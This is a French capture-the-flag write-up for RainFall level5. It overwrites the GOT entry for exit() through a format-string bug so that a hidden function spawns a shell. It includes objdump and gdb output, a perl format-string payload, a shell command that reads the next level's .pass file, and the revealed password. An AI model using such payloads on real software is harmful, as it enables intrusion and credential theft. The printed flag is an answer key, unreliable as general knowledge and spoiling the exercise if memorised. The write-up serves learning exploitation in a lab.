# level5

On a un programme qui contient un main et deux fonctions. Le main appelle la fonction n, mais la fonction o, qui nous intéresse pour obtenir le flag, n'est jamais appellée.

On pense donc à devoir changer la valeur d'eip par l'addresse de la fonction o, sauf qu'on n'arrive jamais à la fin du main à cause de la fonction exit().

L'idée serait donc de changer la valeur de l'appel d'exit par l'addresse de la fonction o.

On obtient l'adresse d'exit avec la commande objdump :
```bash
level5@RainFall:~$ objdump -R level5

level5:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
08049814 R_386_GLOB_DAT    __gmon_start__
08049848 R_386_COPY        stdin
08049824 R_386_JUMP_SLOT   printf
08049828 R_386_JUMP_SLOT   _exit
0804982c R_386_JUMP_SLOT   fgets
08049830 R_386_JUMP_SLOT   system
08049834 R_386_JUMP_SLOT   __gmon_start__
08049838 R_386_JUMP_SLOT   exit
0804983c R_386_JUMP_SLOT   __libc_start_main
```

L'addresse de o est obtenable directement viagdb :
```bash
(gdb) disassemble o
Dump of assembler code for function o:
   0x080484a4 <+0>:    push   %ebp
   0x080484a5 <+1>:    mov    %esp,%ebp
   0x080484a7 <+3>:    sub    $0x18,%esp
   0x080484aa <+6>:    movl   $0x80485f0,(%esp)
   0x080484b1 <+13>:    call   0x80483b0 <system@plt>
   0x080484b6 <+18>:    movl   $0x1,(%esp)
   0x080484bd <+25>:    call   0x8048390 <_exit@plt>
End of assembler dump.
```
On utilise la même méthode que le level précédent pour conceptualiser notre payload (0x080484a4 en décimal donne 134513828, moins les 4 caractères déjà écrits) :
```bash
perl -e 'print "\x38\x98\x04\x08"."%134513824x"."%4\$n"' > /tmp/payload
```
La méthode est un peu longue à cause de la grande quantité d'espaces à imprimer mais on finit bien dans la fonction o comme attendu :
```bash
level5@RainFall:~$ cat /tmp/payload - | ./level5

< encore plus d`espaces >

  200
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```
